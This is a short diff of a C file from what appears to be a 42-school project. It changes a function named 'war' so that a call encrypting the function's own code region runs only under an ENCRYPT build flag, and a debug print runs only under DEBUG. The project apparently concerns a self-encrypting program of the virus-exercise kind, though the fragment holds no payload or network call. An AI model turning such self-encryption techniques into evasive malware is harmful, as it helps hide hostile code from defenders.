@@ -6,7 +6,7 @@
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:17:19 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/03/27 11:52:45 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/03/31 16:41:25 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -14,9 +14,17 @@
 
 void	war(t_data *data)
 {
-//	update_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
-	char de[] = "war\n";
-	_write(1, de, 4);
+
+#ifdef ENCRYPT
+	update_two(&data->key, (char*)war, (size_t)locate - (size_t)war);
+#endif
+
+#ifdef DEBUG
+	char de[] = "war\t \n";
+	data->context == true ?	de[4] = 49 : 48;
+	_write(1, de, _strlen(de));
+#endif
+
 	//	printf("war key = %lx\n", data->key.two);
 
 	if (data->context == false)
